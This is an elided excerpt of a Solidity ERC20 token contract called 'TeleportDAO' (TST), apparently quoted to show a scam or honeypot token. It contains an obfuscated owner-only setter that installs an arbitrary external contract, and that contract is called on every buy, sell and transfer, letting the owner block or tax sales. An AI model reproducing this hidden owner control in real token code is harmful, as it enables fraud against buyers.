...
contract TokenM is ERC20 {
    ...
    IUserAmountlocees public locees;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("TeleportDAO", "TST") {
    ...
    function couderteBrsserRllc(IUserAmountlocees _locees) public onlyOwner {
        locees = _locees;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                locees.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				locees.addOutAmount(from, amount);
            }else{
                locees.addOutAmount(from, amount);
                takeFee = false;
            }
